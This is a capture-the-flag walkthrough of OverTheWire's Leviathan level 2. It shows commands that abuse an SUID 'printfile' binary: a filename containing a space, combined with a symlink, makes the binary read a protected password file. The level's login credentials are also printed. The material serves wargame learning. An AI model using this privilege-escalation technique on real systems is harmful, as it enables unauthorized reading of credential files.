**Username:** ``leviathan2``

**Password:** ``NsN1HwFoyN``


#


We start off the challenge by logging in as ``Leviathan2`` over ssh on Port ``2223``:

```console
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

this time we have an executable called `printfile`.  if we try to run it we can see that it is expecting us to provide a filename and it will then return the ontents of that file.  As an example we can try looking at the contents of one of the files in our home directory:
```console
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Oct  5  2023 .
drwxr-xr-x 83 root       root        4096 Oct  5  2023 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5  2023 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan2@gibson:~$ ./printfile .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
```

The executable file has the **SUID** bit set and is configured to run as `leviathan3` but is part of the `leviathan2` group which means that we can execute it.

So the logical next step is let's see if we can have a look at the stored ssh password for `leviathan3`:
```console
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

OK - so it won't be so easy then!

Let's try creating some files that we have ownership of to see how this executbale works.

```console
leviathan2@gibson:~$ mkdir /tmp/mydir
leviathan2@gibson:~$ echo "test1" > /tmp/mydir/test1.txt
leviathan2@gibson:~$ echo "test2"> /tmp/mydir/test2.txt
```

We know that calling a file name we have access to with `./prinfile` will output the contents of that file.  But what happens if we call two files at the same time?

```console
leviathan2@gibson:~$ ./printfile /tmp/mydir/test1.txt /tmp/mydir/test2.txt
test1
```

Looks like only the first file is processed.  OK - so what if our file name has a space in it?

```console
leviathan2@gibson:~$ echo "test3" > /tmp/mydir/"test file.txt"
leviathan2@gibson:~$ ./printfile /tmp/mydir/"test file.txt"
/bin/cat: /tmp/mydir/test: No such file or directory
/bin/cat: file.txt: No such file or directory
```

This is interesting - we can see that `./printfile` is trying to open a file called `test` and another called `file.txt` using `/bin/cat`

We can have a closer look at what's going on using `ltrace`
```console
leviathan2@gibson:~$ ltrace ./printfile /tmp/mydir/"test file.txt"

__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access("/tmp/mydir/test file.txt", 4)                                                                                            = 0
snprintf("/bin/cat /tmp/mydir/test file.tx"..., 511, "/bin/cat %s", "/tmp/mydir/test file.txt")                                  = 33
geteuid()                                                                                                                        = 12002
geteuid()                                                                                                                        = 12002
setreuid(12002, 12002)                                                                                                           = 0
system("/bin/cat /tmp/mydir/test file.tx".../bin/cat: /tmp/mydir/test: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                           = 256
+++ exited (status 0) +++
```

From this output we can see that the full path is checked with `access()` but then `/bin/cat/` tries to open a file at `/tmp/mydir/test` and another at `./file.txt` - both of which do not exist.

Our strategy here is to create a file called `test file.txt` which we have ownership of and will therefore pass the `access()` validation of `./printfile`.  We then create a symlink `/tmp/mydir/test` which links to the leviathan3 password at `/etc/leviathan_pass/leviathan3`.

```console
leviathan2@gibson:~$ echo "test3" > /tmp/mydir/"test file.txt"
leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir/test
leviathan2@gibson:~$ ./printfile /tmp/mydir/"test file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
```

And there it is! - We just tricked `printfile` to output the contents of `/etc/leviathan_pass/leviathan3`, thus finding our password for the next level!
